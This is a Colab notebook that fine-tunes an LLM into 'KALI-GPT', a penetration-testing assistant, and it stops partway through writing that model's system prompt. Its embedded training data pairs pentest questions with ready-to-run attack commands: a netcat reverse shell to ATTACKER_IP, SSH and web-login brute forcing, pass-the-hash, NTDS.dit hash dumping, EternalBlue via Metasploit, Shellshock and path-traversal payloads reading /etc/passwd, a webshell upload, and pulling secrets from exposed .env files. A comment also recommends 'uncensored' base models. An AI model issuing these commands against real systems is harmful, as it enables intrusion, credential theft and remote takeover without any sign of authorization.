{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "gpuType": "T4"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "# üêâ Kali-GPT Fine-Tuning Notebook\n",
        "\n",
        "Train your own AI model for penetration testing - **no local GPU required!**\n",
        "\n",
        "This notebook will:\n",
        "1. Install dependencies (Unsloth for fast LoRA training)\n",
        "2. Load pentesting training data\n",
        "3. Fine-tune a base model\n",
        "4. Export for use with Ollama\n",
        "\n",
        "**Time:** ~15-30 minutes on free T4 GPU\n",
        "\n",
        "---\n",
        "\n",
        "## ‚ö†Ô∏è Before You Start\n",
        "\n",
        "1. Go to **Runtime ‚Üí Change runtime type**\n",
        "2. Select **T4 GPU** (free) or **A100** (faster, Colab Pro)\n",
        "3. Click **Save**\n",
        "\n",
        "---"
      ],
      "metadata": {
        "id": "header"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Step 1: Install Dependencies\n",
        "\n",
        "This installs Unsloth (fast LoRA training) and required packages."
      ],
      "metadata": {
        "id": "step1_header"
      }
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "install_deps"
      },
      "outputs": [],
      "source": [
        "%%capture\n",
        "# Install Unsloth for fast fine-tuning\n",
        "!pip install \"unsloth[colab-new] @ git+https://github.com/unslothai/unsloth.git\"\n",
        "!pip install --no-deps trl peft accelerate bitsandbytes triton\n",
        "!pip install xformers\n",
        "\n",
        "print(\"‚úÖ Dependencies installed!\")"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Verify GPU\n",
        "import torch\n",
        "print(f\"GPU: {torch.cuda.get_device_name(0)}\")\n",
        "print(f\"VRAM: {torch.cuda.get_device_properties(0).total_memory / 1024**3:.1f} GB\")\n",
        "print(f\"CUDA: {torch.version.cuda}\")"
      ],
      "metadata": {
        "id": "verify_gpu"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Step 2: Load Training Data\n",
        "\n",
        "You have two options:\n",
        "- **Option A:** Use the default pentesting dataset (recommended)\n",
        "- **Option B:** Upload your own custom dataset"
      ],
      "metadata": {
        "id": "step2_header"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Option A: Use default pentesting training data\n",
        "# This creates 85+ examples covering common pentest scenarios\n",
        "\n",
        "TRAINING_DATA = '''\n",
        "{\"instruction\": \"You are a penetration tester. The target is 192.168.1.100. What's the first command to run?\", \"output\": \"THOUGHT: Start with port scanning to identify open services\\\\nACTION: nmap -sV -sC -T4 192.168.1.100\"}\n",
        "{\"instruction\": \"Nmap shows port 80 open with Apache. What's next?\", \"output\": \"THOUGHT: Web server detected, need to identify technologies and potential vulnerabilities\\\\nACTION: whatweb http://192.168.1.100\"}\n",
        "{\"instruction\": \"Whatweb shows WordPress 5.9. What should I do?\", \"output\": \"THOUGHT: WordPress detected, use specialized scanner for plugins and vulnerabilities\\\\nACTION: wpscan --url http://192.168.1.100 --enumerate ap,at,u\"}\n",
        "{\"instruction\": \"I need to find hidden directories on a web server at 10.0.0.5\", \"output\": \"THOUGHT: Directory enumeration to find hidden paths\\\\nACTION: gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirb/common.txt -t 50\"}\n",
        "{\"instruction\": \"Port 445 is open. How do I enumerate SMB?\", \"output\": \"THOUGHT: SMB open, enumerate shares and users\\\\nACTION: enum4linux -a 192.168.1.100\"}\n",
        "{\"instruction\": \"I found SMB shares. How do I list them?\", \"output\": \"THOUGHT: List available SMB shares with smbclient\\\\nACTION: smbclient -L //192.168.1.100 -N\"}\n",
        "{\"instruction\": \"There's an anonymous FTP on port 21. How to check it?\", \"output\": \"THOUGHT: Check for anonymous FTP access and list files\\\\nACTION: ftp 192.168.1.100\"}\n",
        "{\"instruction\": \"I need to check for SQL injection on a login form at http://target.com/login\", \"output\": \"THOUGHT: Test for SQL injection vulnerabilities\\\\nACTION: sqlmap -u \\\\\"http://target.com/login\\\\\" --forms --batch --dbs\"}\n",
        "{\"instruction\": \"How do I scan for vulnerabilities on port 443?\", \"output\": \"THOUGHT: Run vulnerability scripts against HTTPS\\\\nACTION: nmap --script=vuln -p443 192.168.1.100\"}\n",
        "{\"instruction\": \"I need to brute force SSH on 192.168.1.50\", \"output\": \"THOUGHT: Brute force SSH with common credentials\\\\nACTION: hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.50\"}\n",
        "{\"instruction\": \"Check SSL/TLS configuration on target.com\", \"output\": \"THOUGHT: Analyze SSL/TLS for weak ciphers and vulnerabilities\\\\nACTION: sslscan target.com\"}\n",
        "{\"instruction\": \"I found a .git directory exposed. How do I dump it?\", \"output\": \"THOUGHT: Extract git repository for source code and secrets\\\\nACTION: git-dumper http://target.com/.git ./git-dump\"}\n",
        "{\"instruction\": \"Port 3306 MySQL is open. How to enumerate?\", \"output\": \"THOUGHT: Enumerate MySQL for databases and users\\\\nACTION: nmap --script=mysql-info,mysql-enum -p3306 192.168.1.100\"}\n",
        "{\"instruction\": \"I have credentials admin:password123. Test them on SSH.\", \"output\": \"THOUGHT: Test credentials against SSH\\\\nACTION: sshpass -p 'password123' ssh admin@192.168.1.100\"}\n",
        "{\"instruction\": \"How do I find all hosts on 192.168.1.0/24?\", \"output\": \"THOUGHT: Network discovery to find live hosts\\\\nACTION: nmap -sn 192.168.1.0/24\"}\n",
        "{\"instruction\": \"Check for default credentials on web interfaces\", \"output\": \"THOUGHT: Use nuclei for default credential checks\\\\nACTION: nuclei -u http://192.168.1.100 -t default-logins/\"}\n",
        "{\"instruction\": \"I need DNS information for target.com\", \"output\": \"THOUGHT: Gather DNS records for reconnaissance\\\\nACTION: dig target.com ANY +short\"}\n",
        "{\"instruction\": \"How to enumerate SNMP on 192.168.1.100?\", \"output\": \"THOUGHT: SNMP enumeration for system information\\\\nACTION: snmpwalk -v2c -c public 192.168.1.100\"}\n",
        "{\"instruction\": \"Scan for common web vulnerabilities\", \"output\": \"THOUGHT: Comprehensive web vulnerability scan\\\\nACTION: nikto -h http://192.168.1.100\"}\n",
        "{\"instruction\": \"I found port 6379 Redis open. How to check it?\", \"output\": \"THOUGHT: Check for unauthenticated Redis access\\\\nACTION: redis-cli -h 192.168.1.100 INFO\"}\n",
        "{\"instruction\": \"How to extract metadata from a PDF file?\", \"output\": \"THOUGHT: Extract metadata for information gathering\\\\nACTION: exiftool document.pdf\"}\n",
        "{\"instruction\": \"I need to crack an MD5 hash: 5f4dcc3b5aa765d61d8327deb882cf99\", \"output\": \"THOUGHT: Crack MD5 hash using wordlist\\\\nACTION: hashcat -m 0 -a 0 5f4dcc3b5aa765d61d8327deb882cf99 /usr/share/wordlists/rockyou.txt\"}\n",
        "{\"instruction\": \"How to test for CORS misconfiguration?\", \"output\": \"THOUGHT: Check CORS headers for misconfigurations\\\\nACTION: curl -sI -H \\\\\"Origin: https://evil.com\\\\\" http://target.com | grep -i access-control\"}\n",
        "{\"instruction\": \"Port 5432 PostgreSQL is open. Enumerate it.\", \"output\": \"THOUGHT: Enumerate PostgreSQL databases\\\\nACTION: nmap --script=pgsql-brute -p5432 192.168.1.100\"}\n",
        "{\"instruction\": \"How do I scan for Log4Shell vulnerability?\", \"output\": \"THOUGHT: Scan for Log4j/Log4Shell CVE-2021-44228\\\\nACTION: nuclei -u http://192.168.1.100 -t cves/2021/CVE-2021-44228.yaml\"}\n",
        "{\"instruction\": \"I need to enumerate Active Directory users\", \"output\": \"THOUGHT: Enumerate AD users via LDAP\\\\nACTION: ldapsearch -x -H ldap://192.168.1.100 -b \\\\\"dc=domain,dc=local\\\\\" \\\\\"(objectClass=user)\\\\\" sAMAccountName\"}\n",
        "{\"instruction\": \"How to check for open redirects?\", \"output\": \"THOUGHT: Test for open redirect vulnerabilities\\\\nACTION: nuclei -u http://target.com -t vulnerabilities/generic/open-redirect.yaml\"}\n",
        "{\"instruction\": \"I found LFI. How to exploit it?\", \"output\": \"THOUGHT: Local File Inclusion exploitation\\\\nACTION: curl \\\\\"http://target.com/page.php?file=../../../etc/passwd\\\\\"\"}\n",
        "{\"instruction\": \"How to enumerate Kerberos users?\", \"output\": \"THOUGHT: Kerberos user enumeration via AS-REP\\\\nACTION: kerbrute userenum -d domain.local --dc 192.168.1.100 /usr/share/wordlists/usernames.txt\"}\n",
        "{\"instruction\": \"I need to find emails for a domain\", \"output\": \"THOUGHT: OSINT email gathering\\\\nACTION: theHarvester -d target.com -b all\"}\n",
        "{\"instruction\": \"Port 27017 MongoDB is open. Check for auth bypass.\", \"output\": \"THOUGHT: Check for unauthenticated MongoDB access\\\\nACTION: mongo --host 192.168.1.100 --eval \\\\\"db.adminCommand('listDatabases')\\\\\"\"}\n",
        "{\"instruction\": \"How to check for SSRF vulnerability?\", \"output\": \"THOUGHT: Server-Side Request Forgery testing\\\\nACTION: nuclei -u http://target.com -t vulnerabilities/generic/ssrf-detection.yaml\"}\n",
        "{\"instruction\": \"I found .env file exposed. What info to look for?\", \"output\": \"THOUGHT: Extract credentials and secrets from .env\\\\nACTION: curl -s http://target.com/.env | grep -E \\\\\"(KEY|SECRET|PASS|TOKEN|DB_)\\\\\"\"}\n",
        "{\"instruction\": \"How to enumerate NFS shares?\", \"output\": \"THOUGHT: List NFS exports\\\\nACTION: showmount -e 192.168.1.100\"}\n",
        "{\"instruction\": \"Port 1433 MSSQL is open. Enumerate it.\", \"output\": \"THOUGHT: Enumerate MSSQL server\\\\nACTION: nmap --script=ms-sql-info,ms-sql-config -p1433 192.168.1.100\"}\n",
        "{\"instruction\": \"I need to find hidden parameters on a web page\", \"output\": \"THOUGHT: Parameter discovery for hidden inputs\\\\nACTION: arjun -u http://target.com/page.php\"}\n",
        "{\"instruction\": \"How to check for XXE vulnerability?\", \"output\": \"THOUGHT: XML External Entity injection test\\\\nACTION: nuclei -u http://target.com -t vulnerabilities/generic/xxe-detection.yaml\"}\n",
        "{\"instruction\": \"I found a file upload. How to test it?\", \"output\": \"THOUGHT: Test file upload for bypass and RCE\\\\nACTION: curl -X POST -F \\\\\"file=@shell.php;filename=shell.php.jpg\\\\\" http://target.com/upload\"}\n",
        "{\"instruction\": \"Check Windows host for vulnerabilities with credentials\", \"output\": \"THOUGHT: Authenticated vulnerability scan\\\\nACTION: crackmapexec smb 192.168.1.100 -u admin -p password --shares\"}\n",
        "{\"instruction\": \"How do I pass the hash on Windows?\", \"output\": \"THOUGHT: Pass-the-hash attack for lateral movement\\\\nACTION: crackmapexec smb 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\"}\n",
        "{\"instruction\": \"Extract hashes from NTDS.dit\", \"output\": \"THOUGHT: Extract domain hashes from AD database\\\\nACTION: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL\"}\n",
        "{\"instruction\": \"I need to scan for Spring4Shell\", \"output\": \"THOUGHT: Check for Spring4Shell CVE-2022-22965\\\\nACTION: nuclei -u http://target.com -t cves/2022/CVE-2022-22965.yaml\"}\n",
        "{\"instruction\": \"How to enumerate Elasticsearch?\", \"output\": \"THOUGHT: Check Elasticsearch for exposed data\\\\nACTION: curl -s http://192.168.1.100:9200/_cat/indices?v\"}\n",
        "{\"instruction\": \"Test for command injection\", \"output\": \"THOUGHT: Command injection testing\\\\nACTION: commix -u \\\\\"http://target.com/ping.php?ip=127.0.0.1\\\\\" --batch\"}\n",
        "{\"instruction\": \"I found /api endpoint. How to enumerate it?\", \"output\": \"THOUGHT: API endpoint enumeration\\\\nACTION: ffuf -u http://target.com/api/FUZZ -w /usr/share/wordlists/api/endpoints.txt -mc 200,201,301,302\"}\n",
        "{\"instruction\": \"Check for GraphQL introspection\", \"output\": \"THOUGHT: GraphQL schema enumeration\\\\nACTION: curl -s -X POST -H \\\\\"Content-Type: application/json\\\\\" -d '{\\\\\"query\\\\\":\\\\\"{__schema{types{name}}}\\\\\"}' http://target.com/graphql\"}\n",
        "{\"instruction\": \"How to bypass 403 forbidden?\", \"output\": \"THOUGHT: 403 bypass techniques\\\\nACTION: for h in \\\\\"X-Forwarded-For: 127.0.0.1\\\\\" \\\\\"X-Original-URL: /admin\\\\\" \\\\\"X-Rewrite-URL: /admin\\\\\"; do curl -s -H \\\\\"$h\\\\\" http://target.com/admin -o /dev/null -w \\\\\"%{http_code}\\\\\\\\n\\\\\"; done\"}\n",
        "{\"instruction\": \"I need to find secrets in JavaScript files\", \"output\": \"THOUGHT: Extract secrets from JS files\\\\nACTION: katana -u http://target.com -jc | grep -E \\\\\"(api[_-]?key|secret|token|password)\\\\\"\"}\n",
        "{\"instruction\": \"How to scan Docker API?\", \"output\": \"THOUGHT: Check for exposed Docker API\\\\nACTION: curl -s http://192.168.1.100:2375/containers/json | jq\"}\n",
        "{\"instruction\": \"Port 11211 Memcached is open. Check it.\", \"output\": \"THOUGHT: Enumerate Memcached for data\\\\nACTION: echo \\\\\"stats items\\\\\" | nc 192.168.1.100 11211\"}\n",
        "{\"instruction\": \"How to check for Host header injection?\", \"output\": \"THOUGHT: Host header injection testing\\\\nACTION: curl -s -H \\\\\"Host: evil.com\\\\\" http://target.com | grep -i evil\"}\n",
        "{\"instruction\": \"I need to enumerate S3 buckets\", \"output\": \"THOUGHT: AWS S3 bucket enumeration\\\\nACTION: aws s3 ls s3://target-bucket --no-sign-request\"}\n",
        "{\"instruction\": \"How to enumerate RDP users?\", \"output\": \"THOUGHT: RDP user enumeration\\\\nACTION: nmap --script=rdp-ntlm-info -p3389 192.168.1.100\"}\n",
        "{\"instruction\": \"I found admin panel. How to brute force it?\", \"output\": \"THOUGHT: Web form brute force\\\\nACTION: hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form \\\\\"/login:user=^USER^&pass=^PASS^:Invalid\\\\\"\"}\n",
        "{\"instruction\": \"Check for path traversal vulnerability\", \"output\": \"THOUGHT: Path traversal testing\\\\nACTION: ffuf -u \\\\\"http://target.com/file.php?path=FUZZ\\\\\" -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fc 404\"}\n",
        "{\"instruction\": \"What's the nmap command for a full port scan?\", \"output\": \"THOUGHT: Full TCP port scan\\\\nACTION: nmap -p- -T4 192.168.1.100\"}\n",
        "{\"instruction\": \"I found phpinfo exposed. What to look for?\", \"output\": \"THOUGHT: Extract sensitive info from phpinfo\\\\nACTION: curl -s http://target.com/phpinfo.php | grep -E \\\\\"(DOCUMENT_ROOT|SERVER_ADMIN|disable_functions)\\\\\"\"}\n",
        "{\"instruction\": \"Port 161 SNMP is open. Get system info.\", \"output\": \"THOUGHT: SNMP enumeration for system details\\\\nACTION: snmp-check 192.168.1.100 -c public\"}\n",
        "{\"instruction\": \"How to test for SSTI?\", \"output\": \"THOUGHT: Server-Side Template Injection testing\\\\nACTION: curl \\\\\"http://target.com/page?name={{7*7}}\\\\\" | grep 49\"}\n",
        "{\"instruction\": \"I need to find virtual hosts\", \"output\": \"THOUGHT: Virtual host enumeration\\\\nACTION: ffuf -u http://192.168.1.100 -H \\\\\"Host: FUZZ.target.com\\\\\" -w /usr/share/wordlists/subdomains.txt -fc 404\"}\n",
        "{\"instruction\": \"Check Tomcat manager for default credentials\", \"output\": \"THOUGHT: Tomcat manager brute force\\\\nACTION: nmap --script=http-tomcat-brute -p8080 192.168.1.100\"}\n",
        "{\"instruction\": \"How to exploit EternalBlue?\", \"output\": \"THOUGHT: MS17-010 EternalBlue exploitation\\\\nACTION: msfconsole -x \\\\\"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.100; run\\\\\"\"}\n",
        "{\"instruction\": \"I found .htaccess is readable. What does it tell me?\", \"output\": \"THOUGHT: Analyze htaccess for sensitive config\\\\nACTION: curl -s http://target.com/.htaccess\"}\n",
        "{\"instruction\": \"Check for HTTP request smuggling\", \"output\": \"THOUGHT: HTTP request smuggling test\\\\nACTION: python3 smuggler.py -u http://target.com\"}\n",
        "{\"instruction\": \"I need to find backup files on web server\", \"output\": \"THOUGHT: Backup file enumeration\\\\nACTION: ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/backup-extensions.txt -e .bak,.old,.backup,.sql,.zip\"}\n",
        "{\"instruction\": \"Port 8443 is open. What to do?\", \"output\": \"THOUGHT: HTTPS on alternative port, enumerate web service\\\\nACTION: whatweb https://192.168.1.100:8443\"}\n",
        "{\"instruction\": \"Check for CVE-2023-22515 Confluence vulnerability\", \"output\": \"THOUGHT: Check for Atlassian Confluence auth bypass\\\\nACTION: nuclei -u http://target.com -t cves/2023/CVE-2023-22515.yaml\"}\n",
        "{\"instruction\": \"How to test for LDAP injection?\", \"output\": \"THOUGHT: LDAP injection testing\\\\nACTION: curl \\\\\"http://target.com/search?user=*)(uid=*))(|(uid=*\\\\\"\"}\n",
        "{\"instruction\": \"Check for exposed git config\", \"output\": \"THOUGHT: Git configuration disclosure\\\\nACTION: curl -s http://target.com/.git/config\"}\n",
        "{\"instruction\": \"I found Joomla. How to enumerate it?\", \"output\": \"THOUGHT: Joomla CMS enumeration\\\\nACTION: joomscan -u http://target.com\"}\n",
        "{\"instruction\": \"How to enumerate WinRM?\", \"output\": \"THOUGHT: WinRM enumeration and access\\\\nACTION: crackmapexec winrm 192.168.1.100 -u admin -p password\"}\n",
        "{\"instruction\": \"How to check for CVE-2021-41773 Apache path traversal?\", \"output\": \"THOUGHT: Apache 2.4.49 path traversal\\\\nACTION: curl -s \\\\\"http://target.com/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd\\\\\"\"}\n",
        "{\"instruction\": \"I need to scan for ProxyShell\", \"output\": \"THOUGHT: Exchange ProxyShell vulnerabilities\\\\nACTION: nuclei -u https://mail.target.com -t cves/2021/CVE-2021-34473.yaml\"}\n",
        "{\"instruction\": \"How do I exploit SQL injection to dump the database?\", \"output\": \"THOUGHT: SQL injection exploitation for data extraction\\\\nACTION: sqlmap -u \\\\\"http://target.com/page?id=1\\\\\" --dbs --batch\"}\n",
        "{\"instruction\": \"Give me a command to crack password hashes\", \"output\": \"THOUGHT: Password hash cracking\\\\nACTION: hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --force\"}\n",
        "{\"instruction\": \"How do I get a reverse shell on the target?\", \"output\": \"THOUGHT: Reverse shell for remote access\\\\nACTION: nc -e /bin/bash ATTACKER_IP 4444\"}\n",
        "{\"instruction\": \"Scan all TCP ports on 10.10.10.10\", \"output\": \"THOUGHT: Comprehensive port discovery\\\\nACTION: nmap -p- -T4 --min-rate=1000 10.10.10.10\"}\n",
        "{\"instruction\": \"Check if target is vulnerable to Shellshock\", \"output\": \"THOUGHT: Shellshock vulnerability testing\\\\nACTION: curl -H \\\\\"User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'\\\\\" http://target.com/cgi-bin/test.cgi\"}\n",
        "{\"instruction\": \"Enumerate subdomains for example.com\", \"output\": \"THOUGHT: Subdomain enumeration for attack surface\\\\nACTION: subfinder -d example.com -silent\"}\n",
        "{\"instruction\": \"How to check for insecure deserialization?\", \"output\": \"THOUGHT: Java deserialization vulnerability check\\\\nACTION: java -jar ysoserial.jar CommonsCollections5 'id' | base64\"}\n",
        "{\"instruction\": \"Scan for web vulnerabilities with nuclei\", \"output\": \"THOUGHT: Comprehensive vulnerability scan with nuclei\\\\nACTION: nuclei -u http://target.com -t cves/ -t vulnerabilities/ -severity critical,high\"}\n",
        "'''.strip()\n",
        "\n",
        "# Save training data\n",
        "with open('pentest_training_data.jsonl', 'w') as f:\n",
        "    f.write(TRAINING_DATA)\n",
        "\n",
        "# Count examples\n",
        "num_examples = len(TRAINING_DATA.strip().split('\\n'))\n",
        "print(f\"‚úÖ Training data created: {num_examples} examples\")"
      ],
      "metadata": {
        "id": "create_training_data"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Option B: Upload your own training data\n",
        "# Uncomment and run this cell if you want to upload custom data\n",
        "\n",
        "# from google.colab import files\n",
        "# uploaded = files.upload()  # Upload your pentest_training_data.jsonl\n",
        "# print(f\"‚úÖ Uploaded: {list(uploaded.keys())}\")"
      ],
      "metadata": {
        "id": "upload_custom_data"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Step 3: Configure Training\n",
        "\n",
        "Choose your base model and training parameters."
      ],
      "metadata": {
        "id": "step3_header"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# ============================================================\n",
        "# CONFIGURATION - Adjust these settings\n",
        "# ============================================================\n",
        "\n",
        "# Base model (uncensored models recommended for pentesting)\n",
        "BASE_MODEL = \"unsloth/llama-3-8b-bnb-4bit\"  # Best overall\n",
        "# BASE_MODEL = \"unsloth/mistral-7b-bnb-4bit\"  # Faster, smaller\n",
        "# BASE_MODEL = \"unsloth/phi-3-mini-4k-instruct-bnb-4bit\"  # Smallest, fastest\n",
        "\n",
        "# Training parameters\n",
        "MAX_SEQ_LENGTH = 2048\n",
        "EPOCHS = 3\n",
        "BATCH_SIZE = 2\n",
        "LEARNING_RATE = 2e-4\n",
        "\n",
        "# LoRA parameters\n",
        "LORA_R = 16          # Higher = more capacity, more VRAM\n",
        "LORA_ALPHA = 16\n",
        "LORA_DROPOUT = 0\n",
        "\n",
        "# Output\n",
        "OUTPUT_NAME = \"kali-gpt-finetuned\"\n",
        "\n",
        "print(f\"üìã Configuration:\")\n",
        "print(f\"   Base Model: {BASE_MODEL}\")\n",
        "print(f\"   Epochs: {EPOCHS}\")\n",
        "print(f\"   LoRA Rank: {LORA_R}\")\n",
        "print(f\"   Output: {OUTPUT_NAME}\")"
      ],
      "metadata": {
        "id": "config"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Step 4: Load Model and Prepare for Training"
      ],
      "metadata": {
        "id": "step4_header"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from unsloth import FastLanguageModel\n",
        "from unsloth import is_bfloat16_supported\n",
        "import torch\n",
        "\n",
        "print(\"üîÑ Loading base model... (this takes a few minutes)\")\n",
        "\n",
        "model, tokenizer = FastLanguageModel.from_pretrained(\n",
        "    model_name=BASE_MODEL,\n",
        "    max_seq_length=MAX_SEQ_LENGTH,\n",
        "    dtype=None,  # Auto-detect\n",
        "    load_in_4bit=True,\n",
        ")\n",
        "\n",
        "print(f\"‚úÖ Model loaded: {BASE_MODEL}\")"
      ],
      "metadata": {
        "id": "load_model"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Add LoRA adapters\n",
        "print(\"üîÑ Adding LoRA adapters...\")\n",
        "\n",
        "model = FastLanguageModel.get_peft_model(\n",
        "    model,\n",
        "    r=LORA_R,\n",
        "    target_modules=[\"q_proj\", \"k_proj\", \"v_proj\", \"o_proj\",\n",
        "                   \"gate_proj\", \"up_proj\", \"down_proj\"],\n",
        "    lora_alpha=LORA_ALPHA,\n",
        "    lora_dropout=LORA_DROPOUT,\n",
        "    bias=\"none\",\n",
        "    use_gradient_checkpointing=\"unsloth\",\n",
        "    random_state=42,\n",
        ")\n",
        "\n",
        "print(\"‚úÖ LoRA adapters added\")\n",
        "print(f\"   Trainable parameters: {model.print_trainable_parameters()}\")"
      ],
      "metadata": {
        "id": "add_lora"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Step 5: Prepare Training Dataset"
      ],
      "metadata": {
        "id": "step5_header"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import json\n",
        "from datasets import Dataset\n",
        "\n",
        "# Load training data\n",
        "print(\"üîÑ Loading training data...\")\n",
        "\n",
        "examples = []\n",
        "with open('pentest_training_data.jsonl', 'r') as f:\n",
        "    for line in f:\n",
        "        if line.strip():\n",
        "            examples.append(json.loads(line))\n",
        "\n",
        "print(f\"   Loaded {len(examples)} examples\")\n",
        "\n",
        "# Format for training (Alpaca format)\n",
        "alpaca_prompt = \"\"\"### Instruction:\n",
        "{instruction}\n",
        "\n",
        "### Response:\n",
        "{output}\"\"\"\n",
        "\n",
        "def format_example(example):\n",
        "    return {\n",
        "        \"text\": alpaca_prompt.format(\n",
        "            instruction=example[\"instruction\"],\n",
        "            output=example[\"output\"]\n",
        "        )\n",
        "    }\n",
        "\n",
        "formatted = [format_example(ex) for ex in examples]\n",
        "dataset = Dataset.from_list(formatted)\n",
        "\n",
        "print(f\"‚úÖ Dataset prepared: {len(dataset)} training examples\")\n",
        "\n",
        "# Show a sample\n",
        "print(\"\\nüìù Sample training example:\")\n",
        "print(\"-\" * 50)\n",
        "print(dataset[0][\"text\"][:500])\n",
        "print(\"-\" * 50)"
      ],
      "metadata": {
        "id": "prepare_dataset"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Step 6: Train the Model! üöÄ\n",
        "\n",
        "This is where the magic happens. Training takes ~15-30 minutes on a T4 GPU."
      ],
      "metadata": {
        "id": "step6_header"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from trl import SFTTrainer\n",
        "from transformers import TrainingArguments\n",
        "\n",
        "print(\"üöÄ Starting training...\")\n",
        "print(f\"   This will take approximately 15-30 minutes on T4 GPU\")\n",
        "print()\n",
        "\n",
        "trainer = SFTTrainer(\n",
        "    model=model,\n",
        "    tokenizer=tokenizer,\n",
        "    train_dataset=dataset,\n",
        "    dataset_text_field=\"text\",\n",
        "    max_seq_length=MAX_SEQ_LENGTH,\n",
        "    dataset_num_proc=2,\n",
        "    packing=False,\n",
        "    args=TrainingArguments(\n",
        "        per_device_train_batch_size=BATCH_SIZE,\n",
        "        gradient_accumulation_steps=4,\n",
        "        warmup_steps=5,\n",
        "        num_train_epochs=EPOCHS,\n",
        "        learning_rate=LEARNING_RATE,\n",
        "        fp16=not is_bfloat16_supported(),\n",
        "        bf16=is_bfloat16_supported(),\n",
        "        logging_steps=10,\n",
        "        optim=\"adamw_8bit\",\n",
        "        weight_decay=0.01,\n",
        "        lr_scheduler_type=\"linear\",\n",
        "        seed=42,\n",
        "        output_dir=\"outputs\",\n",
        "        report_to=\"none\",\n",
        "    ),\n",
        ")\n",
        "\n",
        "# Train!\n",
        "trainer_stats = trainer.train()\n",
        "\n",
        "print()\n",
        "print(\"=\"*60)\n",
        "print(\"üéâ TRAINING COMPLETE!\")\n",
        "print(\"=\"*60)\n",
        "print(f\"   Final Loss: {trainer_stats.training_loss:.4f}\")\n",
        "print(f\"   Training Time: {trainer_stats.metrics['train_runtime']:.0f} seconds\")"
      ],
      "metadata": {
        "id": "train"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Step 7: Test the Fine-Tuned Model"
      ],
      "metadata": {
        "id": "step7_header"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Test the model\n",
        "print(\"üß™ Testing fine-tuned model...\")\n",
        "print()\n",
        "\n",
        "FastLanguageModel.for_inference(model)\n",
        "\n",
        "test_prompts = [\n",
        "    \"You are a pentester. Target is 10.0.0.50. What's the first command?\",\n",
        "    \"Port 80 is open with nginx. What should I scan next?\",\n",
        "    \"I found WordPress on target.com. How do I enumerate it?\",\n",
        "    \"How do I check for SQL injection on http://vuln.site/search?q=test\",\n",
        "]\n",
        "\n",
        "for i, prompt in enumerate(test_prompts, 1):\n",
        "    print(f\"\\n{'='*60}\")\n",
        "    print(f\"Test {i}: {prompt[:50]}...\")\n",
        "    print(\"=\"*60)\n",
        "\n",
        "    inputs = tokenizer(\n",
        "        f\"### Instruction:\\n{prompt}\\n\\n### Response:\\n\",\n",
        "        return_tensors=\"pt\"\n",
        "    ).to(\"cuda\")\n",
        "\n",
        "    outputs = model.generate(\n",
        "        **inputs,\n",
        "        max_new_tokens=128,\n",
        "        temperature=0.7,\n",
        "        do_sample=True,\n",
        "    )\n",
        "\n",
        "    response = tokenizer.decode(outputs[0], skip_special_tokens=True)\n",
        "    # Extract just the response part\n",
        "    if \"### Response:\" in response:\n",
        "        response = response.split(\"### Response:\")[1].strip()\n",
        "\n",
        "    print(f\"\\n{response[:300]}\")"
      ],
      "metadata": {
        "id": "test_model"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Step 8: Save and Export the Model"
      ],
      "metadata": {
        "id": "step8_header"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Save LoRA weights\n",
        "print(\"üíæ Saving model...\")\n",
        "\n",
        "model.save_pretrained(OUTPUT_NAME)\n",
        "tokenizer.save_pretrained(OUTPUT_NAME)\n",
        "print(f\"   ‚úÖ LoRA weights saved to: {OUTPUT_NAME}/\")\n",
        "\n",
        "# Save merged model (for Ollama)\n",
        "print(\"\\nüíæ Saving merged model for Ollama...\")\n",
        "model.save_pretrained_merged(\n",
        "    f\"{OUTPUT_NAME}-merged\",\n",
        "    tokenizer,\n",
        "    save_method=\"merged_16bit\",\n",
        ")\n",
        "print(f\"   ‚úÖ Merged model saved to: {OUTPUT_NAME}-merged/\")"
      ],
      "metadata": {
        "id": "save_model"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Create Ollama Modelfile\n",
        "modelfile_content = f\"\"\"FROM ./{OUTPUT_NAME}-merged\n",
        "\n",
        "PARAMETER temperature 0.7\n",
        "PARAMETER top_p 0.9\n",
        "PARAMETER num_ctx 4096\n",
        "\n",
        "SYSTEM \\\"\\\"\\\"You are KALI-GPT, an expert penetration testing AI.\n",
        "\n",
